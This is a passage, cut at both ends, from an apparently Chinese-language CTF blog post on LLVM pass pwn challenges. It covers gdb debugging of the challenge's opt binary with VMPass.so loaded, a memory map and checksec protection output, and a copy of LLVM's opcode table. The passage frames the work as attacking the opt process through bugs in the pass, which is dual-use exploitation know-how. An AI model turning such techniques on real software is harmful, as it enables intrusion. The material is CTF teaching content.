class="string">&quot;VMPass&quot;</span>, v2, (<span class="type">unsigned</span> <span class="type">int</span>)<span class="string">&quot;VMPass&quot;</span>, v1, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> __cxa_atexit(func, &amp;unk_20E990, &amp;off_20E548);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="gdb调试"><a href="#gdb调试" class="headerlink" title="gdb调试"></a>gdb调试</h2><p>一般调试对象都是题目给定的opt,调试的步骤一般是</p>
<p><code>gdb ./opt-8</code>进入调试</p>
<p>之后<code>set args -load ./VMPass.so -VMPass ./exp.ll</code>配置参数</p>
<p><code>opt</code>会在一系列初始化函数(<u>gdb调试非常明显的一大坨</u>)之后的第一个call映射so共享模块</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2024-04-13_110404.png" alt=""></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff3b5d000     0x7ffff3b6b000 r-xp     e000      0 /home/aichch/pwn/redhat21-simpVM/VMPass.so</span><br><span class="line">0x7ffff3b6b000     0x7ffff3d6a000 ---p   1ff000   e000 /home/aichch/pwn/redhat21-simpVM/VMPass.so</span><br><span class="line">0x7ffff3d6a000     0x7ffff3d6b000 r--p     1000   d000 /home/aichch/pwn/redhat21-simpVM/VMPass.so</span><br><span class="line">0x7ffff3d6b000     0x7ffff3d6c000 rw-p     1000   e000 /home/aichch/pwn/redhat21-simpVM/VMPass.so</span><br></pre></td></tr></table></figure>
<p>在第一个地址起始处加上so中的偏移便能够下断点进行调试了</p>
<p><code>opt</code>是在<code>llvm::legacy::PassManager::run(llvm::Module&amp;)</code>处开始进行对<code>RunonFunction</code>的调用</p>
<p>然后在其内部这个位置进入<code>llvm::FPPassManager::runOnModule(llvm::Module&amp;)</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2024-04-13_111145.png" alt=""></p>
<p>之后便正式进入<code>llvm::FPPassManager::runOnFunction(llvm::Function&amp;)</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2024-04-13_111312.png" alt=""></p>
<p>最后调用重写的<code>RunOnFunction</code></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://cdn.jsdelivr.net/gh/ixout/picture@main/img/2024-04-13_111441.png" alt=""></p>
<h2 id="opt"><a href="#opt" class="headerlink" title="opt"></a>opt</h2><p>llvm_pass类题目其其实就是针对<code>opt</code>这个文件</p>
<p>利用so模块中注册的PASS类中的漏洞去pwn攻击<code>opt进程</code></p>
<p>opt的保护一般都是这种情况</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] <span class="string">&#x27;/home/aichch/pwn/qwb2022-yakagame/opt-8&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
<h2 id="opcode"><a href="#opcode" class="headerlink" title="opcode"></a>opcode</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//===-- llvm/Instruction.def - File that describes Instructions -*- C++ -*-===//</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//                     The LLVM Compiler Infrastructure</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// This file is distributed under the University of Illinois Open Source</span></span><br><span class="line"><span class="comment">// License. See LICENSE.TXT for details.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//===----------------------------------------------------------------------===//</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// This file contains descriptions of the various LLVM instructions.  This is</span></span><br><span class="line"><span class="comment">// used as a central place for enumerating the different instructions and</span></span><br><span class="line"><span class="comment">// should eventually be the place to put comments about the instructions.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">//===----------------------------------------------------------------------===//</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// <span class="doctag">NOTE:</span> NO INCLUDE GUARD DESIRED!</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Provide definitions of macros so that users of this file do not have to</span></span><br><span class="line"><span class="comment">// define everything to use it...</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> FIRST_TERM_INST</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FIRST_TERM_INST(num)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> HANDLE_TERM_INST</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> HANDLE_INST</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HANDLE_TERM_INST(num, opcode, Class)</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HANDLE_TERM_INST(num, opcode, Class) HANDLE_INST(num, opcode, Class)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> LAST_TERM_INST</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LAST_TERM_INST(num)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> FIRST_UNARY_INST</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FIRST_UNARY_INST(num)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> HANDLE_UNARY_INST</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> HANDLE_INST</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HANDLE_UNARY_INST(num, opcode, instclass)</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HANDLE_UNARY_INST(num, opcode, Class) HANDLE_INST(num, opcode, Class)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> LAST_UNARY_INST</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LAST_UNARY_INST(num)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> FIRST_BINARY_INST</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FIRST_BINARY_INST(num)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> HANDLE_BINARY_INST</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> HANDLE_INST</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HANDLE_BINARY_INST(num, opcode, instclass)</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HANDLE_BINARY_INST(num, opcode, Class) HANDLE_INST(num, opcode, Class)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> LAST_BINARY_INST</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LAST_BINARY_INST(num)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> FIRST_MEMORY_INST</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FIRST_MEMORY_INST(num)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> HANDLE_MEMORY_INST</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> HANDLE_INST</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HANDLE_MEMORY_INST(num, opcode, Class)</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HANDLE_MEMORY_INST(num, opcode, Class) HANDLE_INST(num, opcode, Class)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> LAST_MEMORY_INST</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LAST_MEMORY_INST(num)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> FIRST_CAST_INST</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FIRST_CAST_INST(num)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> HANDLE_CAST_INST</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> HANDLE_INST</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HANDLE_CAST_INST(num, opcode, Class)</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HANDLE_CAST_INST(num, opcode, Class) HANDLE_INST(num, opcode, Class)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> LAST_CAST_INST</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LAST_CAST_INST(num)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> FIRST_FUNCLETPAD_INST</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FIRST_FUNCLETPAD_INST(num)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> HANDLE_FUNCLETPAD_INST</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> HANDLE_INST</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HANDLE_FUNCLETPAD_INST(num, opcode, Class)</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HANDLE_FUNCLETPAD_INST(num, opcode, Class) HANDLE_INST(num, opcode, Class)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> LAST_FUNCLETPAD_INST</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LAST_FUNCLETPAD_INST(num)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> FIRST_OTHER_INST</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FIRST_OTHER_INST(num)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> HANDLE_OTHER_INST</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> HANDLE_INST</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HANDLE_OTHER_INST(num, opcode, Class)</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HANDLE_OTHER_INST(num, opcode, Class) HANDLE_INST(num, opcode, Class)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> LAST_OTHER_INST</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LAST_OTHER_INST(num)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> HANDLE_USER_INST</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> HANDLE_USER_INST(num, opc, Class) HANDLE_OTHER_INST(num, opc, Class)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Terminator Instructions - These instructions are used to terminate a basic</span></span><br><span class="line"><span class="comment">// block of the program.   Every basic block must end with one of these</span></span><br><span class="line"><span class="comment">// instructions for it to be a well formed basic block.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"> FIRST_TERM_INST  ( <span class="number">1</span>)</span><br><span class="line">HANDLE_TERM_INST  ( <span class="number">1</span>, Ret           , ReturnInst)</span><br><span class="line">HANDLE_TERM_INST  ( <span class="number">2</span>, Br            , BranchInst)</span><br><span class="line">HANDLE_TERM_INST  ( <span class="number">3</span>, Switch        , SwitchInst)</span><br><span class="line">HANDLE_TERM_INST  ( <span class="number">4</span>, IndirectBr    , IndirectBrInst)</span><br><span class="line">HANDLE_TERM_INST  ( <span class="number">5</span>, Invoke        , InvokeInst)</span><br><span class="line">HANDLE_TERM_INST  ( <span class="number">6</span>, Resume        , ResumeInst)</span><br><span class="line">HANDLE_TERM_INST  ( <span class="number">7</span>, Unreachable   , UnreachableInst)</span><br><span class="line">HANDLE_TERM_INST  ( <span class="number">8</span>, CleanupRet    , CleanupReturnInst)</span><br><span class="line">HANDLE_TERM_INST  ( <span class="number">9</span>, CatchRet      , CatchReturnInst)</span><br><span class="line">HANDLE_TERM_INST  (<span class="number">10</span>, CatchSwitch   , CatchSwitchInst)</span><br><span class="line">  LAST_TERM_INST  (<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// Standard unary operators...</span></span><br><span class="line"> FIRST_UNARY_INST(<span class="number">11</span>)</span><br><span class="line">HANDLE_UNARY_INST(<span class="number">11</span>, FNeg  , UnaryOperator)</span><br><span class="line">  LAST_UNARY_INST(<span class="number">11</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// Standard binary operators...</span></span><br><span class="line"> FIRST_BINARY_INST(<span class="number">12</span>)</span><br><span class="line">HANDLE_BINARY_INST(<span class="number">12</span>, Add  , BinaryOperator)</span><br><span class="line">HANDLE_BINARY_INST(<span class="number">13</span>, FAdd , BinaryOperator)</span><br><span class="line">HANDLE_BINARY_INST(<span class="number">14</span>, Sub  , BinaryOperator)</span><br><span class="line">HANDLE_BINARY_INST(<span class="number">15</span>, FSub , BinaryOperator)</span><br><span class="line">HANDLE_BINARY_INST(<span class="number">16</span>, Mul  , BinaryOperator)</span><br><span class="line">HANDLE_BINARY_INST(<span class="number">17</span>, FMul , BinaryOperator)</span><br><span class="line">HANDLE_BINARY_INST(<span class="number">18</span>, UDiv , BinaryOperator)</span><br><span class="line">HANDLE_BINARY_INST(<span class="number">19</span>, SDiv , BinaryOperator)</span><br><span class="line">HANDLE_BINARY_INST(<span class="number">20</span>, FDiv , BinaryOperator)</span><br><span class="line">HANDLE_BINARY_INST(<span class="number">21</span>, URem , BinaryOperator)</span><br><span class="line">HANDLE_BINARY_INST(<span class="number">22</span>, SRem , BinaryOperator)</span><br><span class="line">HANDLE_BINARY_INST(<span class="number">23</span>, FRem , BinaryOperator)</span><br><span class="line"></span><br><span class="line"><span class="comment">// Logical operators (integer operands)</span></span><br><span class="line">HANDLE_BINARY_INST(<span class="number">24</span>, Shl  , BinaryOperator) <span class="comment">// Shift left  (logical)</span></span><br><span class="line">HANDLE_BINARY_INST(<span class="number">25</span>, LShr , BinaryOperator) <span class="comment">// Shift right (logical)</span></span><br><span class="line">HANDLE_BINARY_INST(<span class="number">26</span>, AShr , BinaryOperator) <span class="comment">// Shift right (arithmetic)</span></span><br><span class="line">HANDLE_BINARY_INST(<span class="number">27</span>, And  , BinaryOperator)</span><br><span class="line">HANDLE_BINARY_INST(<span class="number">28</span>, Or   , BinaryOperator)</span><br><span class="line">HANDLE_BINARY_INST(<span class="number">29</span>, Xor  , BinaryOperator)</span><br><span class="line">  LAST_BINARY_INST(<span class="number">29</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// Memory operators...</span></span><br><span class="line"> FIRST_MEMORY_INST(<span class="number">30</span>)</span><br><span class="line">HANDLE_MEMORY_INST(<span class="number">30</span>, Alloca, AllocaInst)  <span class="comment">// Stack management</span></span><br><span class="line">HANDLE_MEMORY_INST(<span class="number">31</span>, Load  , LoadInst  )  <span class="comment">// Memory manipulation instrs</span></span><br><span class="line">HANDLE_MEMORY_INST(<span class="number">32</span>, Store , StoreInst )</span><br><span class="line">HANDLE_MEMORY_INST(<span class="number">33</span>, GetElementPtr, GetElementPtrInst)</span><br><span class="line">HANDLE_MEMORY_INST(<span class="number">34</span>, Fence , FenceInst )</span><br><span class="line">HANDLE_MEMORY_INST(<span class="number">35</span>, AtomicCmpXchg , AtomicCmpXchgInst )</span><br><span class="line">HANDLE_MEMORY_INST(<span class="number">36</span>, AtomicRMW , AtomicRMWInst )</span><br><span class="line">  LAST_MEMORY_INST(<span class="number">36</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// Cast operators ...</span></span><br><span class="line"><span class="comment">// <span class="doctag">NOTE:</span> The order matters here because CastInst::isEliminableCastPair</span></span><br><span class="line"><span class="comment">// <span class="doctag">NOTE:</span> (see Instructions.cpp) encodes a table based on this ordering.</span></span><br><span class="line"> FIRST_CAST_INST(<span class="number">37</span>)</span><br><span class="line">HANDLE_CAST_INST(<span class="number">37</span>, Trunc   , TruncInst   )  <span class="comment">// Truncate integers</span></span><br><span class="line">HANDLE_CAST_INST(<span class="number">38</span>, ZExt    , ZExtInst    )  <span class="comment">// Zero extend integers</span></span><br><span class="line">HANDLE_CAST_INST(<span class="number">39</span>, SExt    , SExtInst    )  <span class="comment">// Sign extend integers</span></span><br><span class="line">HANDLE_CAST_INST(<span class="number">40</span>, FPToUI  , FPToUIInst  )  <span class="comment">// floating point -&gt; UInt</span></span><br><span class="line">HANDLE_CAST_INST(<span class="number">41</span>, FPToSI  , FPToSIInst  )  <span class="comment">// floating point -&gt; SInt</span></span><br><span class="line">HANDLE_CAST_INST(<span class="number">42</span>, UIToFP  , UIToFPInst  )  <span class="comment">// UInt -&gt; floating point</span></span><br><span class="line">HANDLE_CAST_INST(<span class="number">43</span>, SIToFP  , SIToFPInst  )  <span class="comment">// SInt -&gt; floating point</span></span><br><span class="line">HANDLE_CAST_INST(<span class="number">44</span>, FPTrunc , FPTruncInst )  <span class="comment">// Truncate floating point</span></span><br><span class="line">HANDLE_CAST_INST(<span class="number">45</span>, FPExt   , FPExtInst   )  <span class="comment">// Extend floating point</span></span><br><span class="line">HANDLE_CAST_INST(<span class="number">46</span>, PtrToInt, PtrToIntInst)  <span class="comment">// Pointer -&gt; Integer</span></span><br><span class="line">HANDLE_CAST_INST(<span class="number">47</span>, IntToPtr, IntToPtrInst)  <span class="comment">// Integer -&gt; Pointer</span></span><br><span class="line">HANDLE_CAST_INST(<span class="number">48</span>, BitCast , BitCastInst )  <span class="comment">// Type cast</span></span><br><span class="line">HANDLE_CAST_INST(<span class="number">49</span>, AddrSpaceCast, AddrSpaceCastInst)  <span class="comment">// addrspace cast</span></span><br><span class="line">  LAST_CAST_INST(<span class="number">49</span>)</span><br><span class="line"></span><br><span class="line"> FIRST_FUNCLETPAD_INST(<span class="number">50</span>)</span><br><span class="line">HANDLE_FUNCLETPAD_INST(<span class="number">50</span>, CleanupPad, CleanupPadInst)</span><br><span class="line">HANDLE_FUNCLETPAD_INST(<span class="number">51</span>, CatchPad  , CatchPadInst)</span><br><span class="line">  LAST_FUNCLETPAD_INST(<span class="number">51</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// Other operators...</span></span><br><span class="line"> FIRST_OTHER_INST(<span class="number">52</span>)</span><br><span class="line">HANDLE_OTHER_INST(<span class="number">52</span>, ICmp   , ICmpInst   )  <span class="comment">// Integer comparison instruction</span></span><br><span class="line">HANDLE_OTHER_INST(<span class="number">53</span>, FCmp   , FCmpInst   )  <span class="comment">// Floating point comparison instr.</span></span><br><span class="line">HANDLE_OTHER_INST(<span class="number">54</span>, PHI    , PHINode    )  <span class="comment">// PHI node instruction</span></span><br><span class="line">HANDLE_OTHER_INST(<span class="number">55</span>, Call   , CallInst   )  <span class="comment">// Call a function</span></span><br><span class="line">HANDLE_OTHER_INST(<span class="number">56</span>, Select , SelectInst )  <span class="comment">// select instruction</span></span><br><span class="line">HANDLE_USER_INST (<span class="number">57</span>, UserOp1, Instruction)  <span class="comment">// May be used internally in a pass</span></span><br><span class="line">HANDLE_USER_INST (<span class="number">58</span>, UserOp2, Instruction)  <span class="comment">// Internal to passes only</span></span><br><span class="line">HANDLE_OTHER_INST(<span class="number">59</span>, VAArg  , VAArgInst  )  <span class="comment">// vaarg instruction</span></span><br><span class="line">HANDLE_OTHER_INST(<span class="number">60</span>, ExtractElement, ExtractElementInst)<span class="comment">// extract from vector</span></span><br><span class="line">HANDLE_OTHER_INST(<span class="number">61</span>, InsertElement, InsertElementInst)  <span class="comment">// insert into vector</span></span><br><span class="line">HANDLE_OTHER_INST(<span class="number">62</span>, ShuffleVector, ShuffleVectorInst)  <span class="comment">// shuffle two vectors.</span></span><br><span class="line">HANDLE_OTHER_INST(<span class="number">63</span>, ExtractValue, ExtractValueInst)<span class="comment">// extract from aggregate</span></span><br><span class="line">HANDLE_OTHER_INST(<span class="number">64</span>, InsertValue, InsertValueInst)  <span class="comment">// insert into aggregate</span></span><br><span class="line">HANDLE_OTHER_INST(<span class="number">65</span>, LandingPad, LandingPadInst)  <span class="comment">// Landing pad instruction.</span></span><br><span class="line">  LAST_OTHER_INST(<span class="number">65</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">undef</span>  FIRST_TERM_INST</span></span><br><span class="line"><span class="meta">#<span class="keyword">undef</span> HANDLE_TERM_INST</span></span><br><span class="line"><span class="meta">#<span class="keyword">undef</span>   LAST_TERM_INST</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">undef</span>  FIRST_UNARY_INST</span></span><br><span class="line"><span class="meta">#<span class="keyword">undef</span> HANDLE_UNARY_INST</span></span><br><span class="line"><span class="meta">#<span class="keyword">undef</span>   LAST_UNARY_INST</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">undef</span>  FIRST_BINARY_INST</span></span><br><span class="line"><span class="meta">#<span class="keyword">undef</span> HANDLE_BINARY_INST</span></span><br><span class="line"><span class="meta">#<span class="keyword">undef</span>   LAST_BINARY_INST</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">undef</span>  FIRST_MEMORY_INST</span></span><br><span class="line"><span class="meta">#<span class="keyword">undef</span> HANDLE_MEMORY_INST</span></span><br><span class="line"><span class="meta">#<span class="keyword">undef</span>   LAST_MEMORY_INST</span></span><br><span class="line"></span><br><span class="line"><span 